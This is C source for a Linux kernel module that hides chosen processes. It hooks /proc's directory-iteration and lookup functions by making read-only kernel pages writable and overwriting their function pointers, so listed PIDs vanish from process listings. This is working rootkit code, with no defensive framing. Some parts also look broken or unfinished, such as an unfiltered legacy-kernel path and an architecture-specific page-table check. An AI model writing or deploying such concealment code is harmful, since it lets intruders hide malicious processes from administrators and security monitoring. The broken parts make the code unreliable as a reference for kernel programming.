#include "hide_proc.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/namei.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/vmalloc.h>
#include <linux/dcache.h>
#include <asm/pgtable.h>
#include <asm/tlbflush.h>
#include <linux/sched/task.h> // For init_task

// --- PID list management (copied from original) ---
struct hidden_pid_entry {
    struct list_head list;
    pid_t pid;
};

static LIST_HEAD(hidden_pids);
static DEFINE_SPINLOCK(hidden_lock);

bool is_pid_hidden(pid_t pid) {
    struct hidden_pid_entry *entry;
    bool found = false;

    spin_lock(&hidden_lock);
    list_for_each_entry(entry, &hidden_pids, list) {
        if (entry->pid == pid) {
            found = true;
            break;
        }
    }
    spin_unlock(&hidden_lock);

    return found;
}

void add_hidden_pid(pid_t pid) {
    struct hidden_pid_entry *new_entry;

    if (is_pid_hidden(pid))
        return;

    new_entry = kmalloc(sizeof(struct hidden_pid_entry), GFP_KERNEL);
    if (!new_entry)
        return;

    new_entry->pid = pid;

    spin_lock(&hidden_lock);
    list_add(&new_entry->list, &hidden_pids);
    spin_unlock(&hidden_lock);

    printk(KERN_INFO "[hide_proc] Added PID %d to hidden list\n", pid);
}

void remove_hidden_pid(pid_t pid) {
    struct hidden_pid_entry *entry, *tmp;

    spin_lock(&hidden_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
        if (entry->pid == pid) {
            list_del(&entry->list);
            kfree(entry);
            printk(KERN_INFO "[hide_proc] Removed PID %d from hidden list\n", pid);
            break;
        }
    }
    spin_unlock(&hidden_lock);
}

void clear_hidden_pids(void) {
    struct hidden_pid_entry *entry, *tmp;

    spin_lock(&hidden_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
        list_del(&entry->list);
        kfree(entry);
    }
    spin_unlock(&hidden_lock);

    printk(KERN_INFO "[hide_proc] Cleared all hidden PIDs\n");
}


// --- New implementation using function pointer overwrite ---

static struct mm_struct *kernel_mm = NULL;

// Pointers to store the original functions
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
static int (*original_iterate)(struct file *, struct dir_context *);
#else
static int (*original_iterate)(struct file *, void *, filldir_t);
#endif
static struct dentry * (*original_lookup)(struct inode *,struct dentry *, unsigned int);


// --- Replacement for readdir/iterate ---

struct hooked_dir_context {
    struct dir_context original;
    struct dir_context *original_ctx;
};

static int hooked_filldir(struct dir_context *ctx, const char *name, int namlen,
                          loff_t offset, u64 ino, unsigned int d_type) {
    struct hooked_dir_context *hooked_ctx = container_of(ctx, struct hooked_dir_context, original);
    char *endptr;
    long pid;

    pid = simple_strtol(name, &endptr, 10);
    if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
        return 0; // Skip this entry
    }

    // Call the original actor
    return hooked_ctx->original_ctx->actor(hooked_ctx->original_ctx, name, namlen, offset, ino, d_type);
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
// Our replacement for the ->iterate_shared function pointer
static int hooked_iterate(struct file *file, struct dir_context *ctx)
{
    struct hooked_dir_context hooked_ctx;
    int ret;

    if (!ctx || !ctx->actor) {
        return original_iterate(file, ctx);
    }

    hooked_ctx.original_ctx = ctx;
    memcpy(&hooked_ctx.original, ctx, sizeof(struct dir_context));
    *(filldir_t *)(&hooked_ctx.original.actor) = hooked_filldir;

    ret = original_iterate(file, &hooked_ctx.original);

    ctx->pos = hooked_ctx.original.pos;

    return ret;
}
#else
// Legacy version for older kernels
static int hooked_iterate(struct file *file, void *dirent, filldir_t filldir)
{
    return original_iterate(file, dirent, filldir);
}
#endif


// --- Replacement for lookup ---

static struct dentry * hooked_lookup(struct inode *dir, struct dentry *dentry, unsigned int flags)
{
    struct dentry *result_dentry;
    const char *name;
    char *endptr;
    long pid;

    result_dentry = original_lookup(dir, dentry, flags);

    if (!result_dentry || IS_ERR(result_dentry) || !dentry || !dentry->d_name.name) {
        return result_dentry;
    }

    name = dentry->d_name.name;
    pid = simple_strtol(name, &endptr, 10);

    if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
        dput(result_dentry);
        return ERR_PTR(-ENOENT); // Return error correctly
    }

    return result_dentry;
}


// --- Init and Exit functions ---

// Helper function for huge pages, as suggested by user.
static inline int pmd_huge(pmd_t pmd)
{
    return pmd_val(pmd) && !(pmd_val(pmd) & PMD_TABLE_BIT);
}

static pte_t *get_pte_from_address(struct mm_struct *mm, unsigned long addr)
{
    pgd_t *pgd;
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;

    if (!mm) return NULL;

    pgd = pgd_offset(mm, addr);
    if (pgd_none(*pgd) || pgd_bad(*pgd))
        return NULL;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
    p4d = p4d_offset(pgd, addr);
    if (p4d_none(*p4d) || p4d_bad(*p4d))
        return NULL;
    pud = pud_offset(p4d, addr);
#else
    pud = pud_offset(pgd, addr);
#endif
    if (pud_none(*pud) || pud_bad(*pud))
        return NULL;

    pmd = pmd_offset(pud, addr);
    if (pmd_none(*pmd) || pmd_bad(*pmd))
        return NULL;

    if (pmd_huge(*pmd)) {
        return (pte_t *)pmd;
    }

    return pte_offset_kernel(pmd, addr);
}

static int write_ro_kernel_data(void *addr, void *new_val_ptr, size_t size)
{
    pte_t *pte;
    unsigned long address = (unsigned long)addr;

    pte = get_pte_from_address(kernel_mm, address);
    if (!pte) {
        printk(KERN_ERR "[hide_proc] Failed to get PTE for address %p\n", addr);
        return -EFAULT;
    }

    // Make page writable
    set_pte(pte, pte_mkwrite(*pte));
    flush_tlb_kernel_range(address, address + size);

    // Write the data
    memcpy(addr, new_val_ptr, size);

    // Restore page protection
    set_pte(pte, pte_wrprotect(*pte));
    flush_tlb_kernel_range(address, address + size);

    return 0;
}


int hide_proc_init(void) {
    struct path proc_path;
    struct inode *proc_inode;
    struct file_operations *fops;
    struct inode_operations *iops;
    int ret;

    printk(KERN_INFO "[hide_proc] Initializing process hiding (function pointer overwrite)\n");

    kernel_mm = current->mm;
    if (!kernel_mm) {
        printk(KERN_ERR "[hide_proc] Failed to get kernel mm_struct from current task.\n");
        return -EFAULT;
    }

    ret = kern_path("/proc", LOOKUP_FOLLOW, &proc_path);
    if (ret) {
        printk(KERN_ERR "[hide_proc] Failed to get /proc path: %d\n", ret);
        return ret;
    }

    proc_inode = proc_path.dentry->d_inode;
    if (!proc_inode || !proc_inode->i_fop || !proc_inode->i_op) {
        printk(KERN_ERR "[hide_proc] Failed to get /proc inode operations\n");
        path_put(&proc_path);
        return -ENOENT;
    }

    fops = (struct file_operations *)proc_inode->i_fop;
    iops = (struct inode_operations *)proc_inode->i_op;
    path_put(&proc_path);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
    original_iterate = fops->iterate_shared ? fops->iterate_shared : fops->iterate;
#else
    original_iterate = fops->readdir;
#endif
    original_lookup = iops->lookup;

    if (!original_iterate || !original_lookup) {
        printk(KERN_ERR "[hide_proc] Failed to find readdir/lookup function pointers.\n");
        return -ENOENT;
    }

    preempt_disable();
    
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
    if (fops->iterate_shared) {
        ret = write_ro_kernel_data(&fops->iterate_shared, &hooked_iterate, sizeof(void *));
    } else {
        ret = write_ro_kernel_data(&fops->iterate, &hooked_iterate, sizeof(void *));
    }
#else
    ret = write_ro_kernel_data(&fops->readdir, &hooked_iterate, sizeof(void *));
#endif
    if (ret) {
        preempt_enable();
        printk(KERN_ERR "[hide_proc] Failed to hook readdir function.\n");
        return ret;
    }

    ret = write_ro_kernel_data(&iops->lookup, &hooked_lookup, sizeof(void *));
    if (ret) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
        if (fops->iterate_shared) write_ro_kernel_data(&fops->iterate_shared, &original_iterate, sizeof(void *));
        else write_ro_kernel_data(&fops->iterate, &original_iterate, sizeof(void *));
#else
        write_ro_kernel_data(&fops->readdir, &original_iterate, sizeof(void *));
#endif
        preempt_enable();
        printk(KERN_ERR "[hide_proc] Failed to hook lookup function.\n");
        return ret;
    }
    preempt_enable();

    printk(KERN_INFO "[hide_proc] Successfully hooked /proc operations.\n");
    return 0;
}

void hide_proc_exit(void) {
    struct path proc_path;
    struct inode *proc_inode;
    struct file_operations *fops;
    struct inode_operations *iops;
    int ret;

    printk(KERN_INFO "[hide_proc] Exiting process hiding (restoring pointers)\n");

    if (!original_iterate || !original_lookup) {
        return;
    }

    ret = kern_path("/proc", LOOKUP_FOLLOW, &proc_path);
    if (ret) {
        printk(KERN_ERR "[hide_proc] Failed to get /proc path for exit: %d\n", ret);
        return;
    }

    proc_inode = proc_path.dentry->d_inode;
    fops = (struct file_operations *)proc_inode->i_fop;
    iops = (struct inode_operations *)proc_inode->i_op;
    path_put(&proc_path);

    preempt_disable();
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
    if (fops->iterate_shared) write_ro_kernel_data(&fops->iterate_shared, &original_iterate, sizeof(void *));
    else write_ro_kernel_data(&fops->iterate, &original_iterate, sizeof(void *));
#else
    write_ro_kernel_data(&fops->readdir, &original_iterate, sizeof(void *));
#endif
    write_ro_kernel_data(&iops->lookup, &original_lookup, sizeof(void *));
    preempt_enable();

    clear_hidden_pids();
    printk(KERN_INFO "[hide_proc] Restored /proc operations.\n");
}
